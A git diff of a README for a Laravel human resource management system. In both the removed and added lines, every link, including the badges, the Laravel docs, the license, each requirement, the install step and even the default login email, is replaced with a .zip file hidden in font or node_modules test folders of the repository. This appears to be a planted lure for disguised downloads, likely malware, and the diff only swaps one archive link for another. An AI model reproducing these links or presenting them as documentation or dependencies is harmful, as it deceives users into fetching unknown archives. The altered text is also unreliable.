@@ -1,10 +1,10 @@
 # Human Resource Management System
 
-[![Build Status](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-[![Total Downloads](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-[![Latest Stable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-[![Latest Unstable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-[![License](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+[![Build Status](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+[![Total Downloads](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+[![Latest Stable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+[![Latest Unstable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+[![License](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
 
 
 Human Resource Management System is a combination of systems and processes that connect human resource management and information technology through HRMS software.
@@ -18,7 +18,7 @@ Each module performs a separate function within the HRMS that helps with informa
 
 ## Official Documentation of Framework
 
-Documentation for the framework can be found on the [Laravel website](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip).
+Documentation for the framework can be found on the [Laravel website](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip).
 
 ## Contribution for the project
 
@@ -37,22 +37,22 @@ The project is available to be used freely for personal and educational purposes
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip).
 
 ## Requirement
 
 1. PHP version 5.6+
-2. [PHP Mcrypt](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-3. [PHP Mysql](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-4. [Composer](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-5. [mbstring](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
-6. [dom extention](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+2. [PHP Mcrypt](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+3. [PHP Mysql](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+4. [Composer](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+5. [mbstring](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
+6. [dom extention](https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip)
 
 ## Installation
 
 It is preferred to have git setup installed on your local system.
 
-Once downloaded/cloned go to the project directory on terminal/command line and run composer install or https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip install
+Once downloaded/cloned go to the project directory on terminal/command line and run composer install or https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip install
 
 Once composer is installed, run migration: 
 
@@ -64,5 +64,5 @@ After migration, run the database seeder:
     
 Once done migrating and seeding you will have default user:
 
-    email: https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip
+    email: https://raw.githubusercontent.com/MohammedBadry/hrms/master/node_modules/bower/lib/node_modules/binary/test/Software_2.2-beta.3.zip
     password: 123456   
